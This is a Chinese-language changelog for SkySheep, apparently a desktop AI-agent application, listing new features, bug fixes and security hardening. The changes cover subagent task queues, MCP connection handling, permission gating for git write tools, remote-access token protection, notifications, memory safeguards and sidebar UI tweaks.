    主机走安装器同一份白名单，`.zip` 直链与无关页面明确拒绝）拉回原文，弹窗里看
    清楚它会让 Agent 做什么再决定装不装（只读，正文截到与 load_skill 相同的 2 万字符）。
  - **手动刷新与缓存失效**：索引后端有 60 秒缓存、折叠块首展后整场不再拉取，「随时
    上新」长期不可见——广场新增「↻ 刷新」按钮（`skills.market` 带 `refresh` 参数绕过
    缓存），安装/更新成功也会作废缓存。
  - **安装范围选择与第三方索引标注**：广场新增「安装到 全局技能 / 当前项目」选择
    （未打开项目时禁用后者，此前硬编码装全局）；`SKYSHEEP_MARKET_URL` 指向自建索引时
    界面如实标注「第三方索引」提示自行确认来源。

- **技能广场离线兜底改为随包完整索引**：此前拉不到远程索引时只剩 `BUILTIN_INDEX` 里
  5 条 anthropics 条目——而 20 个中文场景技能明明随主仓库发布。现在打包时把
  `market/index.json` 作为数据文件带进安装包（开发态直接读仓库原件，测试锁两者同步），
  离线也能看到全部 25 个技能；精简内置清单降为最后兜底。

- **子代理后台任务闭环：做完会「叫醒」主 Agent，等待不再靠轮询，并发满员自动排队**。
  此前后台任务跑完只给前端弹条通知，模型若已结束回合，报告就躺在任务簿里等用户来催；
  想等结果只能 `check_task` 反复轮询，一次一整轮模型调用。这次补齐三件事：① 后台任务
  终态时把「任务 X 已完成，用 check_task 获取报告」记入所属会话的待注入队列，下一轮
  开始自动拼进上下文（报告已被取走的不重复提示）；聊天面板的终态通知在任务所属会话
  当前打开且空闲时附「让 Agent 现在汇总」按钮，点了以固定话术发一轮。② 新增
  `wait_task(task_id, timeout_seconds≤300)` 工具：内部等在任务的终态事件上，完成/失败/
  取消立即返回，超时返回当前进度——一次调用顶 N 次轮询。③ 后台派生在并发满员时不再
  直接报错，进入 queued 排队（上限 20），空位出来按序自动开跑；同步派生满员仍报错
  （错误文案指引改后台）。

- **任务簿：持久化、时间戳、单任务取消、长报告自动落盘**。① 终态记录持久化到
  `~/.skysheep/subagent_tasks.json`（保留最近 50 条），重启后 check_task / 任务簿仍可
  查；重启时处于 running/queued 的记录标为「应用重启，任务中断」，不再留假运行。
  ② 任务记录补 created_at / 耗时，任务簿列表与详情弹窗展示 `⏱` 耗时。③ 右面板任务
  条目支持单任务取消（WS 新方法 `tasks.cancel`，远程客户端只能取消自己会话的），
  排队中的直接落终态、运行中的真取消。④ 子代理报告超过 2400 字符自动落盘到
  `<工作目录>/.skysheep/reports/<task_id>-<type>.md`（引擎直写、不过权限门），投递进
  主上下文只带路径 + 开头摘录，几千 token 的报告不再整份挤进主上下文，Writer 类成稿
  也不用主 Agent 二次转录；短报告保持整份内联，行为不变。

- **自定义子代理支持思考强度**：定义新增 `reasoning` 字段（跟随全局 / auto / low /
  medium / high，与内置覆盖同语义），设置页编辑弹窗出下拉；此前只有内置六型能覆盖
  思考强度，自定义子代理只能跟随全局。

- **界面与通知九项打磨：通知从「发得出」到「收得回」**。系统通知此前点击无动作——
  「失焦弹通知把你拉回来」的闭环断在最后一步。这次补齐：

  - **点击系统通知唤回窗口**：打包版启动时向 HKCU 注册 `skysheep://` 协议
    （`desktop.url_scheme`，按实例身份区分，两个身份各注册各的），toast 带上
    `launch="skysheep://focus"`（winotify 1.1 的 protocol 激活）——点击通知系统按协议
    再拉起一次 exe，单实例互斥让第二个进程自动转成「聚焦已有窗口」；协议未注册
    （开发态 / `--browser` 兜底）时与旧版一致，点击无动作。
  - **通知中心可跳转、有类型标识、跨进程留存**：条目按类型着色加图标（任务完成 ✓、
    等确认 ✋，其余圆点），权限请求与任务完成条目带上会话 id，对应标签还开着时点击
    直接切过去（后台权限请求就地亮出确认卡）；时间跨天显示「M/D HH:MM」。历史落到
    ui.json 的 `notif_log`（60 条封顶，读写在 backend 同一套清洗），重启后通知中心
    不再清零——挂机一夜攒下的定时任务结果不会因为重启丢掉。
  - **通知类型开关与提示音作用域**：系统通知卡拆出「任务完成时通知」「Agent 等待
    确认时通知」两个子开关（`notify_kind_done` / `notify_kind_perm`，关掉的类型不弹
    系统通知、不响提示音，仍进通知中心）；提示音补「仅窗口失焦时提示音」开关
    （`notify_sound_focus`，默认开）——此前提示音不受「前台不打扰」约束，盯着屏幕
    看也每轮响一声。
  - **「跟随系统」深浅落点可配**：主题卡下方新增两个下拉（`theme_auto_light` /
    `theme_auto_dark`），浅色不再写死纸墨、深色不再写死夜墨，六个主题任意组合；
    wintheme 启动解析与 index.html 首帧注入同步读取，首帧直接是映射后的主题不闪跳。
  - **主题色卡运行时取色**：六张主题卡的色块改为从 CSS 变量现场取色（挂同属性隐藏
    元素读变量，不切全局主题），index.html 里的内联色降为首帧兜底——改主题色不再
    两处失真；「跟随系统」卡跟随当前解析落点显示对应色板。
  - **缩放/行宽交互补齐**：界面缩放支持 Ctrl+滚轮 与 Ctrl＋ / Ctrl－、Ctrl+0 回默认
    （preventDefault 拦下 WebView2 原生缩放，终端聚焦时不拦，缩放保存防抖 400ms）；
    缩放与行宽、宠物大小都支持「双击数值回默认」；行宽到边界禁用按钮（与缩放一致），
    「双刻度回默认」文案改为「双击数值回默认」。
  - **宠物大小可调**：「对话区宠物」卡新增 ± 步进（`pet_scale`，60%–140%，双击回
    默认），落地边界按实际宽度计算，缩放后拖拽与重力落位照常。
  - **远程控制页一键重启**：设置 · 远程控制新增「↻ 立即重启 SkySheep」——手机控制 /
    远程访问（Tailscale）的开关都要求重启生效，此前要用户自己关掉再找图标。新 WS 方法
    `app.restart`（仅本机可调，远程设备无权重启宿主）：按启动形态构造等价命令拉起
    脱离的新进程（打包态重跑 exe / 脚本态重跑 .pyw / 开发态 `-c` 调入口），随后走
    桌面托盘「退出」同一条收尾链（置 quitting → 提前停服务 → WM_CLOSE 回 GUI 线程），
    窗口几何、托盘清理、crash.flag 清除都不缺席；新实例由既有互斥体等待逻辑接管，
    不用掐着点退场。
  - **访问令牌一键轮换**：手机控制 / Tailscale 面板新增「⟳ 重新生成令牌」——令牌
    二维码一旦截图外传，此前只能手改 config.toml。新 WS 方法 `lan.rotate_token`
    （仅本机可调）生成新令牌并立即生效（守卫每请求读最新配置，不需要重启）：
    旧地址、二维码、已种 cookie 随即作废，令牌验证的失败计数与节流一并清零。

- **MCP 连接管理成套升级**：① **停用开关**——每个服务可「停用/启用」，配置原样
  保留（env/headers 不用重填），停用只是不连接、工具从 Agent 移除（WS 新方法
  `mcp.set_enabled`，仅本机可调；前端列表行直接给按钮）。② **差量重连**——改配置
  不再整台 manager 推倒重建：backend 对比新旧配置，只连接新增/变更、断开被删的
  （`_sync_mcp_changes`），加一个预设不再把其它已连接的远程服务全部拽下来重连一遍，
  各服务器的重连计数也不再被无辜清零。③ **每服务器调用超时**——配置新增
  `timeout` 字段（表单同步可填），重索引/深研究类工具不再被全局 120 秒腰斩。
  ④ **预设卡运行时预检**——后端对预设依赖的运行时（npx / uvx / 独立程序）做
  `shutil.which` 探测，结果随快照带给前端，缺依赖的预设卡置灰并写明缺什么，
  不再点了「添加」才收到「启动命令不存在」。⑤ **图片结果可见**——MCP 工具返回的
  ImageContent 转成上下文图片附件（与 screenshot 同一机制），截图类服务器的结果
  模型真能看见，此前退化成一坨 JSON。⑥ **工具列表热更新**——服务器推送
  `tools/list_changed` 通知时自动重拉清单、换上新的工具包装并重建注册表，服务器
  升级加了工具即插即用，不用手动重连。⑦ **鉴权错误可读化**——远程服务 401/403
  翻译成「鉴权失败：headers 凭证可能过期」，不再甩裸 httpx 错误；新增
  `docs/mcp-远程服务鉴权.md` 说明 headers 配置方法与 token 过期处理（完整 OAuth
  流程暂不支持，理由见文档）。

- **设置 · 关于：会话库备份管理补全 + 页面信息打磨**。备份此前只能「启动时自动留、
  恢复时用」，现在补上日常管理手段，顺带把关于页几处含糊的信息亮清楚：

  - **立即备份**：卡片头部新增按钮（WS 新方法 `session.create_backup`），不受启动
    备份的 20 小时窗口限制——大操作（恢复旧备份、批量改数据）前随时手动留一份，
    仍计入保留的 20 份；有会话在跑时拒绝动手（与恢复同一道防线，避免拷出撕裂的
    库文件）。
  - **备份行删除与目录直达**：每份备份新增「删除」按钮（WS 新方法
    `session.delete_backup`，文件名校验与恢复同一套，路径拼接/非 .db 一律拒绝），
    卡片头部新增「打开目录」；状态行顺带给出全部备份的总占用。
  - **路径点击复制**：配置文件、会话数据库、数据目录、工作目录的长路径点一下即复制
    （就地变色反馈），报障时不用再手动划选一长串。
  - **信息与文案**：无项目态时「工作目录」不再渲染成空白（显示「未设置（快聊模式）」）；
    版本行补「安装版 / 源码版」标注（排障关键信息），版本号只由更新面板展示一处、
    不再重复；新增项目主页 / 更新日志 / MIT License 链接；「当前数据」的写入时间
    统一到秒；反馈失败提示直接给出 Issues 地址；设置导出补「zip 内含明文 API Key」
    的保管提醒（卡片文案 + 导出成功消息 + 按钮悬停提示三处）。

### 修复

- **启动不再被 MCP 连接拖死（「启动失败」页根因修复）**：桌面端给引擎的就绪预算是
  20 秒（`_wait_port`），而引擎此前在 `setup()` 里**同步等全部 MCP 服务器连完**才报
  就绪——单台服务器连不上（uvx 冷启动拉包、代理没就绪、地址写错、服务器挂死）各自
  最多烧 20 秒连接超时，叠加代理拒连时 uvx 的 15~19 秒重试，「服务就绪」被拖到 20.5
  秒，桌面端已判死弹出「启动失败」页（实测：服务 12:29:31 就绪、12:29:33 才判失败，
  差 2 秒；引擎其实起来了）。现在 MCP 初始连接整段移出启动关键路径：`setup()` 立即
  返回，连接在后台任务进行，完成后注入工具注册表、更新 `mcp_warnings` 并向前端广播
  `mcp_updated`（设置页开着就刷新；服务器状态新增「连接中」展示，`_mcp_status_list`
  带 `connecting` 字段）。配置差量同步、全部重连与关机会先取消这条后台连接再动手
  （`_connect_one` 的取消路径本就收割半开 keeper 与子进程，不留孤儿）。顺带修掉一个
  老毛病：`_bind_project` 内部本来就有一段同步 `_sync_mcp_changes()`，启动绑项目时
  已把全部服务器连过一遍，setup 随后重建 manager **又连第二遍**——每个 MCP 服务器
  启动都拉起两个进程（日志里预设服务器消息成对出现即此）。现在 `_bind_project` 增加
  `connect_mcp` 开关，启动路径跳过同步连接，全程只连一遍（MCP 测试套件整体耗时
  48.9s → 30.8s）。桌面端等待预算同时放宽到 60 秒：数据库恢复、备份轮转这类偶发
  慢路径宁可多等，不把「慢」判成「死」。

- **imagegen 的 5 个测试不再依赖真实 DNS**：SSRF 守卫会对生成端点做真实解析，
  而这些用例都走服务商默认 `base_url`（open.bigmodel.cn 等）——本机开着代理的
  Fake-IP DNS 模式时域名会答出 198.18.0.0/15 保留网段，守卫按设计拒绝，测试在本机
  必挂（CI 的干净 DNS 下能过，纯属测试不封网）。改为显式指定测试主机/公网 IP 字面量
  的 `base_url`，解析在测试内作答，用例完全离线、任何网络环境下结果一致。

- **（安全）Git 仓库预设的写操作此前被权限门自动放行**：预设把整台服务器标了
  `readonly: true`，而 mcp-server-git 的 git_add / git_commit / git_reset /
  git_checkout / git_create_branch 是货真价实的写操作——模型可以不打一声招呼就
  提交、重置、切分支，与「写/执行需确认」的安全模型冲突。现在 MCP 工具的安全级
  按「服务器级授权 × 工具自身注解」共同判定：注解只收窄、不放宽，服务器自带
  `read_only_hint=False` 的工具即使标了只读也回到逐次确认（git 的查询类工具自带
  `read_only_hint=True` 照常自动放行，不牺牲顺滑；fetch 这类不声明注解的纯只读
  服务不误伤）。手动配置里标 readonly 的服务同样被这层兜住。
- **MCP 自动重连的失败计数从未累加，死服务器会被无限重试**：重连循环只在成功时
  给计数器 +1，失败不记数——「连到上限就停手」从未真正生效，一台永远起不来的
  服务器会以恒定 2 秒的间隔被拉起进程直到天荒地老，前端状态永远卡在「重连中」；
  反过来计数只算成功，还意味着成功自愈 3 次之后再断线会被永久放弃（上限语义也
  反了）。现在按**连续失败**次数计数、成功即清零，达上限写明结论并停手等手动处理。
- **MCP 连接关闭从别的任务展开 anyio 作用域，取消会打偏**：断线/重连路径此前用
  `ensure_future` 在新任务里直接 aclose 传输栈，而 stdio / streamable HTTP 上下文
  基于 anyio，cancel scope 被跨任务退出时取消会注入无辜任务（实测能把调用方正在
  等待的 await 点一起取消掉，也可能静默泄漏子进程）。现在每条连接由专门的 keeper
  任务独占生命周期（进入与退出都在同一个任务里），关闭只置位停止事件；顺带修掉
  `session.call_tool` 把 JSON-RPC 层错误（未知工具、服务端参数校验失败）也当断线
  误触发重连的问题——协议错误现在按工具层报错抛出，连接保持不动。

- **远程控制加固（安全审查第二轮）**：四件套收口——① 令牌守卫 fail closed：lan /
  Tailscale 开着但令牌为空（配置被手改坏）时，远程请求此前会因为「没令牌可比对」
  直接放行，现在一律 403（本机回环照常免令牌）；② 渠道审批决定只认发起人：群聊里
  chat_id 命中名单时所有成员的消息都是 approved 的，此前任何人回一句 allow 就能替
  群友批准写操作，现在一轮的发起人随 `channel_run` 写进门控，`submit_latest` 校验
  actor，别人的 allow/deny 不生效并得到明确提示；③ 渠道端「总是允许」降级为单次：
  白名单规则是持久化的，从聊天窗口写 allow always 等于永久预授权，账号被盗或手滑
  的代价不成比例——渠道一律只给单次放行（审批卡文案同步），预授权留在桌面端本机
  界面；④ 令牌爆破有代价且看得见：连续验证失败达 5 次的来源进入指数退避的即时
  拒绝（不比对、不阻塞事件循环，封顶 10 分钟，验证成功即清零），失败来源（ip /
  时间 / 总数）进 `lan.status`，设置页面板上直接显示「最近有谁在敲门」。
- **渠道消息排队从「无声黑洞」变成有回执的队列**：一轮跑着时再进来的消息此前
  静默等锁，聊天窗口毫无动静（等审批、思考型模型跑几分钟时像掉线）；现在排队
  即回执「已收到，前面还有 N 条」，一轮超过 10 秒没回音先补一条「还在处理」
  （完成得快就不打扰）；排队上限 5 条，超限直接拒收并告知（每条排队消息都是
  一整轮的 token，不能被刷屏刷爆）。入站消息超 8000 字符截断并注明（飞书单条
  上限 150 KB，此前全量进上下文）。
- **飞书读流线程的「假失败」告警**：读流线程等每条事件的处理结果最多 30 秒，
  渠道串行队列一忙（一轮几分钟、或有排队）超时必现，被记成 warning「feishu
  处理事件失败」——其实 run_coroutine_threadsafe 的超时只是不再等待，协程仍会
  按序处理完。现在超时降为 info（注明「仍在后台排队」），真正的处理失败才告警。
- **开局域网后手机连不上，先想到防火墙**：此前全链路没有防火墙提示，Windows
  首次弹授权被点掉之后，设置页照样显示可访问地址、无从排查。现在 `lan.enable`
  的回执与面板文案都引导「首次弹出的授权要点允许，错过去防火墙设置放行」；面板
  同时标注地址是 http 明文传输、跨网段建议走端到端加密的 Tailscale。
- **群聊白名单的边界写进界面**：设置页渠道卡明确「名单建议只填个人 OpenID——
  填群 chat id 等于全群可控（决定只认发起人）」，不再只靠源码注释约束。

- **演示模式点「立即整理」会把真实记忆覆盖成脚本文案**：归档提炼与定时巡检都有
  `demo_mode` 守卫，唯独手动「立即整理」漏了——演示模式下 FakeProvider 对任何调用
  都回同一句演示文案，整理流程视其为有效输出，memory.md（≥400 字）与 AGENTS.md
  （≥600 字）会被这行占位文本覆盖（原件虽在备份里，界面却提示「已整理」）。现在
  与另外两条路径同一守卫：演示模式点按钮直接报「没有真实模型」。

- **设置页保存全局记忆会静默覆盖后台新写的条目**：归档提炼（追加条目）与定期整理
  （重写全文）都在后台改 memory.md，用户在编辑器开着期间点「保存」，旧编辑整体落盘，
  Agent 刚自动记的内容就没了、无任何提示。现在 memory.get 带 mtime 下发、保存时带回
  比对，不一致即拒绝并提示刷新重读；右侧「项目记忆」面板对 AGENTS.md 同一套防覆盖。

- **「无。」这类带句尾标点的占位行被提炼成一条记忆**：归档提炼解析只按精确匹配过滤
  「无/没有」等占位，模型回「无。」「没有值得记录的内容。」会穿过过滤，变成
  `- [日期] (自动) 无。` 落盘并注入每轮提示词。现在剥句尾标点后再比对占位集合，并
  过滤「没有值得记录的内容」类短句与「以下是提炼结果：」类前导语（含回归用例）。

- **记忆超注入上限是静默的，且会拦腰截断**：每轮注入系统提示词的上限 4000 字符此前
  按字符硬切，可能切在某条记忆中间（半条对模型是噪声），而设置页显示的是全量文件，
  用户无从得知 Agent 只看到前一段。现在截断按行边界取整条，memory.get 带实际注入
  字数，超限时页面明确提示「每轮只注入前 N 字」并建议精简。

- **聊天框点「停止」留下僵尸子代理任务，几次之后并发池被灌满**：同步 `spawn_agent`
  跑在主轮里，「停止」取消的是整个轮次任务，`CancelledError`（BaseException）穿透
  `run_sync` 只捕 `Exception` 的收尾——记录永远停在 running，并发名额（默认 3）被
  假任务占死，之后派子代理一律报「并发已达上限」，只能重启应用。现在 `run_sync` 显式
  捕获取消、落 cancelled 终态并广播，名额即刻释放（含回归用例）。

- **子代理直播卡片可能串台到别的任务**：前端把「第一个到达的 subagent_event」当作
  同步卡片的绑定信号——同步派生刚建卡、自己的事件还没到时，并发中其他后台任务的事件
  会抢先绑上去，之后过程全画错。后端在派生瞬间新增 `subagent_spawned` 广播（带
  task_id / background / queued），前端只认它绑定；排队派生还会在卡片里提示「已进入
  排队」。

- **`check_task` 补会话归属校验（安全）**：任务簿的 list / get / cancel_all 都按
  安全审查 B13 做了会话过滤，唯独模型侧的 `check_task` 全局可查——知道 task_id 就能把
  别的会话派生的任务的完整报告拉进当前上下文。现在与 `get_detail` 同规则校验（跨会话
  一律 `unknown task_id`，不泄露存在性），`wait_task` 出生即同款。

- **task 型子代理的「写文件」不再自相矛盾**：系统提示词说 "READ-ONLY tools… never
  modify anything"，工具集却给了 write_file / edit_file / write_document（子代理内必被
  自动拒绝），模型白试烧轮数；被拒后的文案也只说 "User denied"（像用户否决，会诱发
  重试）。现在提示词统一为「写/执行在子代理内一律自动拒绝、别调也别重试」，task 型
  额外追加「把写入方案（文件 + 内容）写进报告由主 Agent 执行」的说明，预拒绝的
  tool_result 直接带这句说死的文案（PendingPermission 新增 `deny_note` 通道，主循环
  拒认文案默认不变）。

- **子代理 `tools="all" / "readonly"` 不再顺手带上电脑控制七件套**：截屏 / 窗口列表
  属于隐私敏感的只读工具，桶装策略一勾就全进子代理工具集（子代理内只读自动放行）。
  现在 "all" / "readonly" 都排除七件套（`tools.COMPUTER_TOOL_NAMES` 单一清单），
  确有需要仍可在「自定义勾选」里显式点名；设置页选项文案同步标注。

- **拖动面板宽度时左上角红屏刷「ResizeObserver loop completed」**：右面板标签条
  的尺寸观察回调里同步改了布局（切压缩档位），浏览器报出这条良性提示；本身
  不致命，但被全局错误横幅原样展示，拖一下面板就刷一屏红字。两处修：① 回调
  改布局挪进 rAF，且档位无变化不写 DOM（与行卡 RO 同一套做法，那条注释里
  早写过这个坑）；② 错误陷阱忽略该良性提示——真循环的根因在各自的 RO 回调
  里修，而不是把它当应用错误展示。

- **设置·高级「安全与后台」卡的行对齐**：三处不齐一次修掉——① 热键输入框被
  复选框的全局样式（`.toggle-row input` 16px 小方块）压成一个小点，因为选择器
  特异性不够；② 「工作区信任」「全局唤起热键」两行标题贴最左，与勾选框行的
  标题（24px 缩进）不成列；③ `.toggle-row.adv-toggle` 没写回 gap，被文件后部
  的两端对齐版本（gap: 16px）覆盖，标题列又偏 8px。现在整卡统一「标题列 24px
  缩进、控件悬挂行首」的骨架，运行参数卡的四行不受影响。

- **右侧面板标签一多不再横向滚动，改为压缩呈现**：此前标签条放不下就出横向
  滚动条——滚动条占掉面板高度、小触控板/触屏上很难拖，标签多时还得滚来滚去找。
  现在全部标签均分面板宽度（文字截断加省略号，完整标题悬停可见），空间不足时
  逐级降级：先藏图标只留文字，再藏非激活标签的关闭钮（激活的关闭钮保留，
  关闭功能不丢）；标签再多、每格不足 56px 时反过来整格只显示图标代表——
  图标本就每标签不同，比挤成一两个字的文字更好认，关闭钮改为悬停浮在格子
  右上角（太窄放不下并排的 ✕）。档位判定挂上 ResizeObserver，拖面板宽度、
  缩放窗口时即时重算。触屏上关闭钮常显的规则不受影响。

- **点一下 ＋ 会冒出两个会话标签**：启动时没有历史会话会留一张空标签（欢迎页），
  此时点快聊组头的 ＋（或其他开会话的入口），旧代码直接在旁边 push 一张新标签，
  标签栏上就是「新会话 · 会话」两张，看起来像开了两个会话。现在 `openTabForSession`
  先接管一张空占位标签（优先当前激活那张）而不是新建，与 `handleEvent` 里「懒创建
  会话直接认领」同一套做法。连带两处：接管的那张恰好是当前标签时，`activateTab`
  会因「已经是当前标签」早退，标签名与 `currentSessionId` 得就地补上（否则名字永久
  停在「新会话」）；历史加载收口成 `loadTabHistory`，两处共用同一份逻辑。
  同时修掉连点「新建会话」/ Ctrl+N 会不断堆叠空标签的问题。
- **空列表提示看起来能点、点下去没反应**：`empty-hint` 行从不绑定点击（全项目确认无一处
  `onclick`），但 `.list li` 的 `cursor: pointer` 与悬浮蓝底会命中它。现在统一摘掉光标与
  悬浮反馈，让「像可点」与「真可点」一致。
- **空快聊组头的 ＋ 藏起来了**：快聊为空时，组头那个 `＋` 是唯一的建会话入口，本应看得见，
  实际默认 `opacity: 0`、要悬停才出现（实测确认）。现在空组头带 `.is-empty`，`＋` 常显；
  列表里已有会话时仍维持悬停才现，不在常驻列表里放一个一直闪的按钮。

### 变更

- **全局记忆「定期整理」改为即改即存，备份改时间戳滚动**：设置页里归档总闸是切换
  即存、定期整理的开关与周期却要点「保存」，同页两个「保存」按钮各管一摊（选了周期
  顺手点上面那个保存，周期不会生效）。现在整理开关与周期与总闸同一交互：即改即存、
  成功静默、失败回拨，去掉多余的「保存」按钮。整理备份从单份 `.bak`（下次整理即被
  覆盖，改坏后没有更早版本可回退）改为带时间戳的 `.bak-日期时间` 滚动保留最近 5 份，
  备份写失败即放弃本次整理（宁可不动原文件）；「立即整理」按三态反馈——没到规模、
  跑了但无需改动、整理完成，不再把「无需改动」误报成「还没到整理规模」。全局记忆页
  新增 (自动) 条目计数提醒（归档提炼是无确认的后台写入，提醒定期审阅清理）。

- **内置示例提示词文案修订（仅新装用户生效）**：三条模板各修一处——①
  「调研一个话题」正文「请联网调研：，」是占位话题删掉后的标点残留，改为
  「请联网调研「在此填写话题」」，并带上 `{{date}}` 日期锚点（联网调研类
  提示词写明当天日期，减少模型拿旧知识当最新进展）；② 「Excel 转图表报告」
  标题带「图表」正文却只字未提，补上「挑合适的维度画出趋势/分布图（保存为
  图片）」；③ 「帮我修报错」的手工占位「（粘贴报错信息）」改为 `{{clipboard}}`
  占位符，插入时自动替换为剪贴板文本（剪贴板为空或不可读时占位符原样保留，
  app.js 的替换守卫），与「解释这段代码」「写一份周报」两条示例的用法一致。
  内置示例只在首启播种一次（`snippets_seeded` 标记），已存在的安装不受影响。

- **思考强度徽章只显示档位**：输入栏徽章文案从「思考 自动」收紧为只显示当前档位
  （自动 / 低 / 中 / 高）；完整说明保留在悬停提示里，点击调档不变。

- **启动动画页 / 启动失败页 / 退出选择框跟六套主题走**：这三个页面此前只有
  浅/深两套写死配色（退出框更是永远纸墨），青瓷/秋柿/黛夜/松烟下启动页与
  界面主题割裂，深色主题下退出框还是刺眼的浅色对话框。现在六主题的完整 UI
  色板收敛到 `wintheme.THEME_PALETTE`（逐项取自 app.css 同名变量：底色/
  卡纸/抬升/内凹/文字/次要/描边/主色等），三个页面都按当前主题 id 从同一份
  色板取色；深色主题的标题栏文字用亮纸色、边框用近黑墨线（文字与边框分设）。
  启动页接收主题 id 而不是 dark 布尔（旧参数仍兼容），主题在窗口创建前就
  解析完成，首帧即主题色。

- **点会话不再抹掉项目组头的高亮，会话行换用另一种选中样式**：分组视图里点开某个会话时，
  旧代码会清掉列表里所有 `li` 的 `active`——当前项目的组头蓝色高亮也跟着消失。现在点击只清
  会话行（带 `data-sid` 的行）：项目组头（与经典视图的标签过滤组头）的高亮保留，被点开的
  会话行改用「左缘色条 + 淡主色底」的 `.sess-active` 高亮，与项目高亮一眼区分。选中态记在
  `activeSessionSid`，列表因折叠/快照/切项目重画后照它恢复；分组视图里点其他项目的会话
  （先切项目再打开）同样在切完后把选中高亮落在被点的那一行上。
- **侧栏「项目」区在无项目时压成一行动作行**：此前是「标题 + 空提示」的一块死区（两行、
  约 51px 高，可做的事为零），唯一的添加入口是标题行右端一个实测 23×16 像素的加号。
  无项目时改由一整行「＋ 添加项目」承接；随后再次调整：标题行与右端 ＋ 恢复常显
  （无项目时列表为空，＋ 就是唯一入口，与「会话」标题行右端的视图切换钮同一位置模式），
  横线＋行只保留在分组视图标题下那一处。
- **移除搜索范围切换器（本项目 / 全部项目），搜索固定跨全部项目**：会话列表本来就按项目
  分组陈列，搜索结果自带项目名标注、跨项目命中点击自动切过去；分组视图此前就一直固定
  按全部项目搜，经典视图保留这个开关只造成两个视图行为不一致（无项目态下它还会说一个
  并不存在的「本项目」——后端把无项目态的 `scope=project` 解析成 `project_id IS NULL`，
  实际命中的是快聊）。删除后侧栏少一行控件，两个视图搜索行为统一。
- **「会话」标题与分组头不报条数**：曾试过在标题右侧加一个条数徽标，但列表本身就按行陈列、
  数字与视线里的行数重复，最终移除；分组头（快聊 / 标签组 / 项目组）旁边的组内条数同理
  一并移除，组头上只留名称、＋ 与折叠箭头。
- **会话列表不再发空态提示**：此前列表为空会写一行「这个项目下还没有会话——点上面
  「新建会话」，或从下方快聊继续」（及无项目态的另外三种变体）。这些话与就在眼前的
  「新建会话」按钮、快聊组头的 ＋ 重复，且占据侧栏里最贵的一块；现在列表为空就
  留空。搜索无结果与标签筛选无命中这两处提示保留——它们是对主动操作的反馈，
  删掉后用户分不清「没结果」和「出错了」。
- **侧栏视图切换合并成单按钮，按钮组位置随视图搬移**：原先「会话」标题右侧是
  经典/分组两个图标按钮并排（外加「折叠全部」），现在合并成一个——图标显示当前所在
  视图，点击切换、图标随之翻到另一个。「添加项目」＋两种视图共用同一个按钮。
  位置随视图走（DOM 单实例搬移）：经典视图下 [☰][＋] 在「项目」标题行右端
  （第一条横线右方）；分组视图下 [⌄][📁][＋] 在「会话」标题行右端，
  折叠钮排在切换钮左侧。

### 新增

- **用量页「Token 活动」支持柱状 / 折线切换**：卡头新增图表类型分段控件（默认
  柱状，保持原观感），折线图为双线（输入/输出）+ 数据点 + 水平网格线，悬停
  数据点看当日数值；日期轴与柱状图对齐（均分抽样、左早右新）。实现上 SVG
  只画线/点（`preserveAspectRatio=none` 拉满容器宽，`non-scaling-stroke`
  保证线宽不随容器变粗变细），日期标签用 HTML 行均分——SVG 内文字会被
  非等比拉伸变形，不能放里面。选择存 ui.json（`usage_chart`，bar/line 白名单），
  重启后保持。

- **提示词页升级：排序 / 使用统计 / 存为提示词 / 占位符扩展 / 导入导出**。设置 · 提示词
  从「只能增删改」补成完整的一页。① 列表可拖拽排序（行首 ⋮⋮ 手柄），顺序落库并决定
  `~` 候选顺序；新建条目自动置顶，提示词超过 8 条时不再有「早建的永远够不着」。
  ② 使用统计：插入时上报，行内显示「用过 N 次」，页首一行「共 N 条 · 累计使用 M 次」。
  ③ 对话里的用户消息新增「存为提示词」按钮，一键把刚用顺手的那句话存成模板。
  ④ 占位符从 `{{clipboard}}` 扩到 `{{date}}` / `{{time}}` / `{{project}}`，
  编辑弹窗里有一排可点按插入的 chips。⑤ 导入 / 导出（JSON，与白名单导出同款；
  导入按名称+内容去重合并），删掉的内置示例可用「恢复示例」加回；
  内置示例本身从 5 条扩到 7 条（新增「解释这段代码」「写一份周报」，
  都示范了剪贴板占位符）。旧库自动补列，无需手动迁移。

- **固定项目「远程连接」：飞书/微信渠道的对话统一归到它名下**。此前渠道会话
  跟着桌面当前项目走（无项目时落快聊），桌面上切换项目后手机端发的对话会被
  自愈逻辑重开，历史散落各处。现在启动即创建一个固定的「远程连接」项目
  （哨兵记录，无真实目录，不指向磁盘任何位置）：渠道新建/自愈的会话都挂它名下，
  不再随桌面当前项目漂移。该项目不可删除、不可切换（删除会被拒、
  删完真实项目也不会把工作目录绑到它上），侧栏两种视图都能看到它——分组视图里
  是一个可折叠分组（组内会话点击直接打开、不切工作目录），经典视图的「项目」
  列表里点它则打开名下最近的对话；界面上不提供删除按钮。渠道会话的运行时
  工作目录改为用户主目录、白名单归属固定项目，与桌面项目彻底解耦。

- **设置补充八项**：补齐设置面里长期缺席的常用能力，全部即时生效、偏好自动保存。
  ① **启动恢复会话标签**（`session_tabs`/`session_active` 偏好 + 快照 `open_tabs`）：重启后
  回到上次的工作现场，关掉的标签不再恢复、被删会话自动跳过；② **发送键可配**
  （`ctrl_enter_send`）：「用 Ctrl+Enter 发送」开关，开启后 Enter 一律换行；
  ③ **自动检查更新开关**（`update_check`，关于页）：内网/离线不再等超时，手动检查不受影响；
  ④ **新会话默认模型**（`default_model_provider/name`）：模型菜单里 Shift+点击某行设为
  「新会话默认」（★ 标记），只对新创建的会话生效，当前对话与已存在会话不受影响，
  再点一次同手势可覆盖、清除后回到跟随全局；⑤ **通知提示音**（`notify_sound`）：
  任务完成/等确认时 WebAudio 合成短音（完成上行音、等确认下行音），默认关；
  ⑥ **全局唤起热键可改键**（`hotkey`，高级页）：默认仍为 Ctrl+Alt+Space，主键限
  Space / F1–F12 / 部分符号键（不允许抢占字母数字键），改完重启生效；
  ⑦ **子代理并发上限**（`subagent_max_concurrent`，默认 3、1–8）：与迭代轮数同卡设置，
  保存即热生效；⑧ **阅读行宽**（`read_width` → `--chat-max-w`，680–1400px）：
  对话区消息卡最大宽度可调，双击刻度回默认 880px；思考块、工具卡、圆桌卡同宽联动。

- **会话标签可以直接命名**：双击顶栏标签就地改名（Enter 保存 / Esc 取消 / 失焦保存），
  右键标签出菜单（重命名 / 关闭标签）。名字就是会话标题——落库走 `session.rename`，
  标签与侧栏列表同步更新，并广播 `session_updated` 让其它窗口同步改名。
  还没发过消息的空标签也允许预命名：名字先记在标签上，首轮发消息创建会话时随创建
  一并落库，并且那一轮不再请求自动标题——否则用户起的名字一发消息就被模型生成的
  标题冲掉。配套后端两层保护：`session.new` 接受可选 title；手动改名过的会话记入
